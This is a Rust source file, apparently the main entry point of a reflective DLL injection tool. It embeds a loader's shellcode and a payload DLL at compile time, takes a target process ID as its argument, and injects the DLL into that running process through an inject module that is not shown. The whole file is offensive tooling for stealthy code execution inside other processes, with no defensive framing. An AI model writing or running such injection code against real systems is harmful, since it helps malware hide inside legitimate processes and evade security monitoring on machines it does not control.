#[cfg(target_os = "windows")]
mod inject;

use embed_resources::*;

fn main() {
    let loader_offset = extract_shellcode_and_get_export_offset!("..\\loader\\loader.dll", "..\\loader\\loader.dll.bin", "ReflectiveLoader");

    let shellcode = include_bytes!("../../loader/loader.dll.bin");

    #[cfg(debug_assertions)]
    let target_dll_bytes = include_bytes!("../../dll_to_inject/target/debug/toinject.dll");

    #[cfg(not(debug_assertions))]
    let target_dll_bytes = include_bytes!("../../dll_to_inject/target/release/toinject.dll");

    std::process::exit(perform_reflective_dll_injection(shellcode, target_dll_bytes, loader_offset));
}

fn perform_reflective_dll_injection(loader_shellcode: &[u8], dll_bytes: &[u8], loader_offset: u32) -> i32 {
    let args: Vec<String> = std::env::args().collect();
    if args.len() != 2 {
        println!("Usage: {} [target PID]", &args[0]);
        return 1;
    }
    let target_pid_str = &args[1];

    let target_pid = match target_pid_str.parse::<u32>() {
        Ok(p) => p,
        Err(_) => {
            println!("Invalid PID: {}", target_pid_str);
            return 2;
        }
    };

    println!("Reflectively injecting DLL into process ID {}", target_pid);
    unsafe {
        match inject::reflective_dll_injection(target_pid, loader_shellcode, dll_bytes, loader_offset) {
            Ok(_) => {
                println!("Successfully performed DLL injection.");
            },
            Err(e) => {
                println!("DLL injection failed: {}", e);
                return 4;
            }
        }
    }

    return 0;
}
